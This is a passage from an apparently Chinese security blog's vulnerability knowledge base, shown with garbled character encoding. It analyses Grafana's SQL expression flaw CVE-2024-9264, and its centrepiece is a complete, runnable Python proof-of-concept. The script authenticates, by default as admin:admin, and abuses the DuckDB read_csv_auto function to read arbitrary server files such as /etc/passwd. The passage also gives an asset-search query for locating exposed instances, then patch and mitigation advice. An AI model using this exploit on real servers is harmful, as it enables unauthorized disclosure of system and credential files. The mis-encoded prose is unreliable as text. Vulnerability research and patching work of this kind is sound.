tracing.Tracer</code>ï¼šç”¨äºè·Ÿè¸ªå’Œè®°å½•æŸ¥è¯¢æ‰§è¡Œçš„è¿‡ç¨‹ã€‚</li></ul></li><li><strong>è¿”å›å€¼</strong>ï¼šè¿”å›ä¸€ä¸ª <code>mathexp.Results</code> ç±»å‹çš„ç»“æœå’Œä¸€ä¸ª <code>error</code> ç±»å‹çš„é”™è¯¯ã€‚</li></ul><h3 id="æ‰§è¡ŒSQLæŸ¥è¯¢ï¼š"><a href="#æ‰§è¡ŒSQLæŸ¥è¯¢ï¼š" class="headerlink" title="æ‰§è¡ŒSQLæŸ¥è¯¢ï¼š"></a><strong>æ‰§è¡ŒSQLæŸ¥è¯¢</strong>ï¼š</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go">duckDB <span class="token operator">:=</span> duck<span class="token punctuation">.</span><span class="token function">NewInMemoryDB</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">var</span> frame <span class="token operator">=</span> <span class="token operator">&amp;</span>data<span class="token punctuation">.</span>Frame<span class="token punctuation">{</span><span class="token punctuation">}</span>logger<span class="token punctuation">.</span><span class="token function">Debug</span><span class="token punctuation">(</span><span class="token string">"Executing query"</span><span class="token punctuation">,</span> <span class="token string">"query"</span><span class="token punctuation">,</span> gr<span class="token punctuation">.</span>query<span class="token punctuation">,</span> <span class="token string">"frames"</span><span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span>allFrames<span class="token punctuation">)</span><span class="token punctuation">)</span>err <span class="token operator">:=</span> duckDB<span class="token punctuation">.</span><span class="token function">QueryFramesInto</span><span class="token punctuation">(</span>gr<span class="token punctuation">.</span>refID<span class="token punctuation">,</span> gr<span class="token punctuation">.</span>query<span class="token punctuation">,</span> allFrames<span class="token punctuation">,</span> frame<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>åˆ›å»ºä¸€ä¸ªDuckDBçš„å†…å­˜æ•°æ®åº“å®ä¾‹ï¼Œå‡†å¤‡ä¸€ä¸ªæ•°æ®å¸§ <code>frame</code> æ¥å­˜å‚¨æŸ¥è¯¢ç»“æœï¼Œå¹¶è®°å½•è°ƒè¯•ä¿¡æ¯ã€‚ç„¶åæ‰§è¡ŒSQLæŸ¥è¯¢ï¼Œå°†ç»“æœå­˜å‚¨åˆ° <code>frame</code> ä¸­ã€‚</p><h3 id="æ„å»ºç»“æœï¼š"><a href="#æ„å»ºç»“æœï¼š" class="headerlink" title="æ„å»ºç»“æœï¼š"></a><strong>æ„å»ºç»“æœ</strong>ï¼š</h3><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">if</span> frame<span class="token punctuation">.</span><span class="token function">Rows</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token number">0</span> <span class="token punctuation">{</span>    rsp<span class="token punctuation">.</span>Values <span class="token operator">=</span> mathexp<span class="token punctuation">.</span>Values<span class="token punctuation">{</span>        mathexp<span class="token punctuation">.</span>NoData<span class="token punctuation">{</span>Frame<span class="token punctuation">:</span> frame<span class="token punctuation">}</span><span class="token punctuation">,</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span>rsp<span class="token punctuation">.</span>Values <span class="token operator">=</span> mathexp<span class="token punctuation">.</span>Values<span class="token punctuation">{</span>    mathexp<span class="token punctuation">.</span>TableData<span class="token punctuation">{</span>Frame<span class="token punctuation">:</span> frame<span class="token punctuation">}</span><span class="token punctuation">,</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¦‚æœæŸ¥è¯¢ç»“æœä¸ºç©ºï¼Œè®¾ç½®ç»“æœçš„å€¼ä¸º <code>mathexp.NoData</code>ï¼›å¦åˆ™ï¼Œè®¾ç½®ç»“æœçš„å€¼ä¸º <code>mathexp.TableData</code>ï¼ŒåŒ…å«æŸ¥è¯¢ç»“æœçš„æ•°æ®å¸§ã€‚</p></blockquote><p>æ ¸å¿ƒä»£ç ï¼š</p><pre class="line-numbers language-go" data-language="go"><code class="language-go">err <span class="token operator">:=</span> duckDB<span class="token punctuation">.</span><span class="token function">QueryFramesInto</span><span class="token punctuation">(</span>gr<span class="token punctuation">.</span>refID<span class="token punctuation">,</span> gr<span class="token punctuation">.</span>query<span class="token punctuation">,</span> allFrames<span class="token punctuation">,</span> frame<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p><code>QueryFramesInto</code> æ–¹æ³•æ˜¯ DuckDB Go ç»‘å®šæä¾›çš„ä¸€ä¸ªæ–¹æ³•ï¼Œå®ƒå…è®¸ä½ æ‰§è¡Œ SQL æŸ¥è¯¢å¹¶å°†ç»“æœç›´æ¥æ’å…¥åˆ°ä¸€ä¸ª <code>data.Frame</code> ä¸­ã€‚è¿™ä¸ªæ–¹æ³•ç»“åˆäº† SQL æŸ¥è¯¢çš„çµæ´»æ€§å’Œ DataFrame æ“ä½œçš„ä¾¿æ·æ€§ï¼Œä½¿å¾—æ•°æ®å¤„ç†æµç¨‹æ›´åŠ é«˜æ•ˆã€‚</p><p>ä»¥ä¸‹æ˜¯ <code>QueryFramesInto</code> æ–¹æ³•çš„ä¸€èˆ¬ä½¿ç”¨æ–¹å¼ï¼š</p><h3 id="å‡½æ•°ç­¾å"><a href="#å‡½æ•°ç­¾å" class="headerlink" title="å‡½æ•°ç­¾å"></a>å‡½æ•°ç­¾å</h3><p>go</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">func</span> <span class="token punctuation">(</span>db <span class="token operator">*</span>DB<span class="token punctuation">)</span> <span class="token function">QueryFramesInto</span><span class="token punctuation">(</span>refID <span class="token builtin">string</span><span class="token punctuation">,</span> query <span class="token builtin">string</span><span class="token punctuation">,</span> inputFrames <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token operator">*</span>data<span class="token punctuation">.</span>Frame<span class="token punctuation">,</span> resultFrame <span class="token operator">*</span>data<span class="token punctuation">.</span>Frame<span class="token punctuation">)</span> <span class="token builtin">error</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li><code>db *DB</code>: DuckDB æ•°æ®åº“çš„å®ä¾‹æŒ‡é’ˆã€‚</li><li><code>refID string</code>: æŸ¥è¯¢çš„å¼•ç”¨IDï¼Œé€šå¸¸ç”¨äºæ—¥å¿—è®°å½•å’Œè°ƒè¯•ã€‚</li><li><code>query string</code>: è¦æ‰§è¡Œçš„ SQL æŸ¥è¯¢å­—ç¬¦ä¸²ã€‚</li><li><code>inputFrames []*data.Frame</code>: ä¸€ä¸ª <code>data.Frame</code> åˆ‡ç‰‡ï¼ŒåŒ…å«ä½œä¸ºæŸ¥è¯¢è¾“å…¥çš„æ•°æ®ã€‚</li><li><code>resultFrame *data.Frame</code>: ä¸€ä¸ªæŒ‡å‘ <code>data.Frame</code> çš„æŒ‡é’ˆï¼Œç”¨äºå­˜å‚¨æŸ¥è¯¢ç»“æœã€‚</li></ul></blockquote><p>ç”±äºæ²¡æœ‰å¯¹SQLæŸ¥è¯¢å­—ç¬¦ä¸²åšè¿‡æ»¤é™åˆ¶ï¼Œå¯¼è‡´æ¶æ„çš„SQLè¯­å¥ç›´æ¥ä¼ é€’åˆ°DuckDBæ‰§è¡Œã€‚</p><h1 id="å››ã€å®Œæ•´çš„POC"><a href="#å››ã€å®Œæ•´çš„POC" class="headerlink" title="å››ã€å®Œæ•´çš„POC"></a>å››ã€å®Œæ•´çš„POC</h1><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python3</span><span class="token keyword">import</span> requests<span class="token keyword">import</span> json<span class="token keyword">import</span> sys<span class="token keyword">import</span> argparse<span class="token keyword">class</span> <span class="token class-name">Console</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">log</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>msg<span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span>sys<span class="token punctuation">.</span>stderr<span class="token punctuation">)</span>console <span class="token operator">=</span> Console<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">msg_success</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>    console<span class="token punctuation">.</span>log<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[SUCCESS] </span><span class="token interpolation"><span class="token punctuation">{</span>msg<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">msg_failure</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>    console<span class="token punctuation">.</span>log<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"[FAILURE] </span><span class="token interpolation"><span class="token punctuation">{</span>msg<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">failure</span><span class="token punctuation">(</span>msg<span class="token punctuation">)</span><span class="token punctuation">:</span>    msg_failure<span class="token punctuation">(</span>msg<span class="token punctuation">)</span>    sys<span class="token punctuation">.</span>exit<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">authenticate</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> url<span class="token punctuation">,</span> u<span class="token punctuation">,</span> p<span class="token punctuation">)</span><span class="token punctuation">:</span>    res <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>url<span class="token punctuation">}</span></span><span class="token string">/login"</span></span><span class="token punctuation">,</span> json<span class="token operator">=</span><span class="token punctuation">{</span><span class="token string">"password"</span><span class="token punctuation">:</span> p<span class="token punctuation">,</span> <span class="token string">"user"</span><span class="token punctuation">:</span> u<span class="token punctuation">}</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"message"</span><span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token string">"Logged in"</span><span class="token punctuation">:</span>        msg_success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Logged in as </span><span class="token interpolation"><span class="token punctuation">{</span>u<span class="token punctuation">}</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">{</span>p<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        failure<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Failed to log in as </span><span class="token interpolation"><span class="token punctuation">{</span>u<span class="token punctuation">}</span></span><span class="token string">:</span><span class="token interpolation"><span class="token punctuation">{</span>p<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">run_query</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> url<span class="token punctuation">,</span> query<span class="token punctuation">)</span><span class="token punctuation">:</span>    query_url <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"</span><span class="token interpolation"><span class="token punctuation">{</span>url<span class="token punctuation">}</span></span><span class="token string">/api/ds/query?ds_type=__expr__&amp;expression=true&amp;requestId=1"</span></span>    query_payload <span class="token operator">=</span> <span class="token punctuation">{</span>        <span class="token string">"from"</span><span class="token punctuation">:</span> <span class="token string">"1696154400000"</span><span class="token punctuation">,</span>        <span class="token string">"to"</span><span class="token punctuation">:</span> <span class="token string">"1696345200000"</span><span class="token punctuation">,</span>        <span class="token string">"queries"</span><span class="token punctuation">:</span> <span class="token punctuation">[</span>            <span class="token punctuation">{</span>                <span class="token string">"datasource"</span><span class="token punctuation">:</span> <span class="token punctuation">{</span>                    <span class="token string">"name"</span><span class="token punctuation">:</span> <span class="token string">"Expression"</span><span class="token punctuation">,</span>                    <span class="token string">"type"</span><span class="token punctuation">:</span> <span class="token string">"__expr__"</span><span class="token punctuation">,</span>                    <span class="token string">"uid"</span><span class="token punctuation">:</span> <span class="token string">"__expr__"</span>                <span class="token punctuation">}</span><span class="token punctuation">,</span>                <span class="token string">"expression"</span><span class="token punctuation">:</span> query<span class="token punctuation">,</span>                <span class="token string">"hide"</span><span class="token punctuation">:</span> <span class="token boolean">False</span><span class="token punctuation">,</span>                <span class="token string">"refId"</span><span class="token punctuation">:</span> <span class="token string">"B"</span><span class="token punctuation">,</span>                <span class="token string">"type"</span><span class="token punctuation">:</span> <span class="token string">"sql"</span><span class="token punctuation">,</span>                <span class="token string">"window"</span><span class="token punctuation">:</span> <span class="token string">""</span>            <span class="token punctuation">}</span>        <span class="token punctuation">]</span>    <span class="token punctuation">}</span>    res <span class="token operator">=</span> s<span class="token punctuation">.</span>post<span class="token punctuation">(</span>query_url<span class="token punctuation">,</span> json<span class="token operator">=</span>query_payload<span class="token punctuation">)</span>    data <span class="token operator">=</span> res<span class="token punctuation">.</span>json<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token comment"># Handle unexpected response</span>    <span class="token keyword">if</span> <span class="token string">"message"</span> <span class="token keyword">in</span> data<span class="token punctuation">:</span>        msg_failure<span class="token punctuation">(</span><span class="token string">"Unexpected response:"</span><span class="token punctuation">)</span>        msg_failure<span class="token punctuation">(</span>json<span class="token punctuation">.</span>dumps<span class="token punctuation">(</span>data<span class="token punctuation">,</span> indent<span class="token operator">=</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span>        <span class="token keyword">return</span> <span class="token boolean">None</span>    <span class="token comment"># Extract results</span>    frames <span class="token operator">=</span> data<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"results"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"B"</span><span class="token punctuation">,</span> <span class="token punctuation">{</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"frames"</span><span class="token punctuation">,</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> frames<span class="token punctuation">:</span>        values <span class="token operator">=</span> <span class="token punctuation">[</span>            row            <span class="token keyword">for</span> frame <span class="token keyword">in</span> frames            <span class="token keyword">for</span> row <span class="token keyword">in</span> frame<span class="token punctuation">[</span><span class="token string">"data"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token string">"values"</span><span class="token punctuation">]</span>        <span class="token punctuation">]</span>                <span class="token keyword">if</span> values<span class="token punctuation">:</span>            msg_success<span class="token punctuation">(</span><span class="token string">"Successfully ran DuckDB query:"</span><span class="token punctuation">)</span>            <span class="token keyword">return</span> values    failure<span class="token punctuation">(</span><span class="token string">"No valid results found."</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">decode_output</span><span class="token punctuation">(</span>values<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token string">":"</span><span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token builtin">str</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token keyword">for</span> i <span class="token keyword">in</span> row <span class="token keyword">if</span> i <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">)</span> <span class="token keyword">for</span> row <span class="token keyword">in</span> values<span class="token punctuation">]</span><span class="token keyword">def</span> <span class="token function">main</span><span class="token punctuation">(</span>url<span class="token punctuation">,</span> user<span class="token operator">=</span><span class="token string">"admin"</span><span class="token punctuation">,</span> password<span class="token operator">=</span><span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token builtin">file</span><span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> requests<span class="token punctuation">.</span>Session<span class="token punctuation">(</span><span class="token punctuation">)</span>    authenticate<span class="token punctuation">(</span>s<span class="token punctuation">,</span> url<span class="token punctuation">,</span> user<span class="token punctuation">,</span> password<span class="token punctuation">)</span>    <span class="token builtin">file</span> <span class="token operator">=</span> <span class="token builtin">file</span> <span class="token keyword">or</span> <span class="token string">"/etc/passwd"</span>    escaped_filename <span class="token operator">=</span> requests<span class="token punctuation">.</span>utils<span class="token punctuation">.</span>quote<span class="token punctuation">(</span><span class="token builtin">file</span><span class="token punctuation">)</span>    query <span class="token operator">=</span> <span class="token string-interpolation"><span class="token string">f"SELECT * FROM read_csv_auto('</span><span class="token interpolation"><span class="token punctuation">{</span>escaped_filename<span class="token punctuation">}</span></span><span class="token string">');"</span></span>    content <span class="token operator">=</span> run_query<span class="token punctuation">(</span>s<span class="token punctuation">,</span> url<span class="token punctuation">,</span> query<span class="token punctuation">)</span>    <span class="token keyword">if</span> content<span class="token punctuation">:</span>        msg_success<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Retrieved file </span><span class="token interpolation"><span class="token punctuation">{</span><span class="token builtin">file</span><span class="token punctuation">}</span></span><span class="token string">:"</span></span><span class="token punctuation">)</span>        <span class="token keyword">for</span> line <span class="token keyword">in</span> decode_output<span class="token punctuation">(</span>content<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>line<span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    parser <span class="token operator">=</span> argparse<span class="token punctuation">.</span>ArgumentParser<span class="token punctuation">(</span>description<span class="token operator">=</span><span class="token string">"Arbitrary File Read in Grafana via SQL Expression (CVE-2024-9264)."</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--url"</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"URL of the Grafana instance to exploit"</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--user"</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"Username to log in as, defaults to 'admin'"</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--password"</span><span class="token punctuation">,</span> default<span class="token operator">=</span><span class="token string">"admin"</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"Password used to log in, defaults to 'admin'"</span><span class="token punctuation">)</span>    parser<span class="token punctuation">.</span>add_argument<span class="token punctuation">(</span><span class="token string">"--file"</span><span class="token punctuation">,</span> <span class="token builtin">help</span><span class="token operator">=</span><span class="token string">"File to read on the server, defaults to '/etc/passwd'"</span><span class="token punctuation">)</span>    args <span class="token operator">=</span> parser<span class="token punctuation">.</span>parse_args<span class="token punctuation">(</span><span class="token punctuation">)</span>    main<span class="token punctuation">(</span>args<span class="token punctuation">.</span>url<span class="token punctuation">,</span> args<span class="token punctuation">.</span>user<span class="token punctuation">,</span> args<span class="token punctuation">.</span>password<span class="token punctuation">,</span> args<span class="token punctuation">.</span><span class="token builtin">file</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h1 id="äº”ã€æ¼æ´æµ‹ç»˜"><a href="#äº”ã€æ¼æ´æµ‹ç»˜" class="headerlink" title="äº”ã€æ¼æ´æµ‹ç»˜"></a>äº”ã€æ¼æ´æµ‹ç»˜</h1><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token assign-left variable">app</span><span class="token operator">=</span><span class="token string">"Grafana_Labs-å…¬å¸äº§å“"</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="å…­ã€æ¼æ´ä¿®å¤"><a href="#å…­ã€æ¼æ´ä¿®å¤" class="headerlink" title="å…­ã€æ¼æ´ä¿®å¤"></a>å…­ã€æ¼æ´ä¿®å¤</h1><h2 id="6-1-å®˜æ–¹æ¼æ´ä¿®å¤"><a href="#6-1-å®˜æ–¹æ¼æ´ä¿®å¤" class="headerlink" title="6.1 å®˜æ–¹æ¼æ´ä¿®å¤"></a>6.1 å®˜æ–¹æ¼æ´ä¿®å¤</h2><p>11.4.0ï¼ˆlatestï¼‰çš„æºä»£ç ä¸­å¯¹duckDBçš„åŠŸèƒ½ç›´æ¥è¿›è¡Œäº†åˆ é™¤ã€‚</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">db :<span class="token operator">=</span> <span class="token keyword">sql</span><span class="token punctuation">.</span>NewInMemoryDB<span class="token punctuation">(</span><span class="token punctuation">)</span>var frame <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token keyword">data</span><span class="token punctuation">.</span>Frame{}logger<span class="token punctuation">.</span>Debug<span class="token punctuation">(</span><span class="token string">"Executing query"</span><span class="token punctuation">,</span> <span class="token string">"query"</span><span class="token punctuation">,</span> gr<span class="token punctuation">.</span>query<span class="token punctuation">,</span> <span class="token string">"frames"</span><span class="token punctuation">,</span> <span class="token function">len</span><span class="token punctuation">(</span>allFrames<span class="token punctuation">)</span><span class="token punctuation">)</span>err :<span class="token operator">=</span> db<span class="token punctuation">.</span>QueryFramesInto<span class="token punctuation">(</span>gr<span class="token punctuation">.</span>refID<span class="token punctuation">,</span> gr<span class="token punctuation">.</span>query<span class="token punctuation">,</span> allFrames<span class="token punctuation">,</span> frame<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2016.54.21.png" alt="11.4.0" style="zoom:50%;"><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2016.55.04.png" alt="11.1.0" style="zoom:50%;"><p>11.1.0ä¸­çš„å¯¼å…¥æ¨¡å—åˆ—è¡¨ä¸­å­˜åœ¨duck</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"context"</span><span class="token string">"errors"</span><span class="token string">"fmt"</span><span class="token string">"time"</span><span class="token string">"github.com/grafana/grafana-plugin-sdk-go/data"</span><span class="token string">"github.com/scottlepp/go-duck/duck"</span><span class="token string">"github.com/grafana/grafana/pkg/expr/mathexp"</span><span class="token string">"github.com/grafana/grafana/pkg/expr/sql"</span><span class="token string">"github.com/grafana/grafana/pkg/infra/tracing"</span><span class="token string">"github.com/grafana/grafana/pkg/util/errutil"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>11.4.0 çš„å¯¼å…¥æ¨¡å—åˆ—è¡¨ä¸­åˆ é™¤äº†duckDB</p><pre class="line-numbers language-go" data-language="go"><code class="language-go"><span class="token keyword">import</span> <span class="token punctuation">(</span><span class="token string">"context"</span><span class="token string">"errors"</span><span class="token string">"fmt"</span><span class="token string">"time"</span><span class="token string">"github.com/grafana/grafana-plugin-sdk-go/data"</span><span class="token string">"github.com/grafana/grafana/pkg/apimachinery/errutil"</span><span class="token string">"github.com/grafana/grafana/pkg/expr/mathexp"</span><span class="token string">"github.com/grafana/grafana/pkg/expr/sql"</span><span class="token string">"github.com/grafana/grafana/pkg/infra/tracing"</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>11.4.0åˆ é™¤äº†sqlè¡¨è¾¾å¼åŠŸèƒ½çš„å®ç°ã€‚</p><img src="/2024/12/06/lou-dong-zhi-shi-ku/grafana-biao-da-shi-yuan-cheng-dai-ma-zhi-xing-cve-2024-9264/%E6%88%AA%E5%B1%8F2024-12-23%2017.00.22.png" alt="11.4.0åˆ é™¤äº†sqlè¡¨è¾¾å¼åŠŸèƒ½çš„å®ç°" style="zoom:40%;"><h2 id="6-2-ä¼ä¸šä¿®å¤å»ºè®®"><a href="#6-2-ä¼ä¸šä¿®å¤å»ºè®®" class="headerlink" title="6.2 ä¼ä¸šä¿®å¤å»ºè®®"></a>6.2 ä¼ä¸šä¿®å¤å»ºè®®</h2><p>1ï¼‰å»ºè®®ç”¨æˆ·ç«‹å³å‡çº§åˆ°å·²æ‰“è¡¥ä¸çš„ç‰ˆæœ¬ï¼š</p><ul><li>11.0.5+security-01 ï¼ˆä»…å®‰å…¨ä¿®å¤ï¼‰</li><li>11.1.6+security-01 ï¼ˆä»…å®‰å…¨ä¿®å¤ï¼‰</li><li>11.2.1+security-01 (ä»…å®‰å…¨ä¿®å¤)</li><li>11.0.6+security-01 ï¼ˆåŒ…å«æœ€æ–°åŠŸèƒ½å’Œå®‰å…¨ä¿®å¤ï¼‰</li><li>11.1.7+security-01 ï¼ˆåŒ…å«æœ€æ–°åŠŸèƒ½å’Œå®‰å…¨ä¿®å¤ï¼‰</li><li>11.2.2+security-01 ï¼ˆåŒ…æ‹¬æœ€æ–°åŠŸèƒ½å’Œå®‰å…¨ä¿®å¤ï¼‰</li></ul><p>2ï¼‰ä½œä¸ºä¸´æ—¶ç¼“è§£æªæ–½ï¼Œå¯ä»¥ä»ç³»ç»Ÿçš„ PATH ä¸­ç§»é™¤ DuckDB äºŒè¿›åˆ¶æ–‡ä»¶æˆ–å®Œå…¨å¸è½½å®ƒã€‚</p><h1 id="å‚è€ƒæ–‡çŒ®"><a href="#å‚è€ƒæ–‡çŒ®" class="headerlink" title="å‚è€ƒæ–‡çŒ®"></a>å‚è€ƒæ–‡çŒ®</h1><ul><li><a href="https://securityonline.info/grafana-vulnerability-cve-2024-9264-poc-released-for-9-9-rated-critical-flaw/">https://securityonline.info/grafana-vulnerability-cve-2024-9264-poc-released-for-9-9-rated-critical-flaw/</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> æ¼æ´çŸ¥è¯†åº“ </category>
          
      </categories>
      
      
        <tags>
            
            <tag> æ¼æ´çŸ¥è¯†åº“ </tag>
            
            <tag> Grafanaè¡¨è¾¾å¼è¿œç¨‹ä»£ç æ‰§è¡Œ(CVE-2024-9264) </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Druidæœªæˆæƒè®¿é—®æ¼æ´</title>
      <link href="/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/"/>
      <url>/2024/12/05/lou-dong-zhi-shi-ku/druid-wei-shou-quan-fang-wen-lou-dong/</url>
      
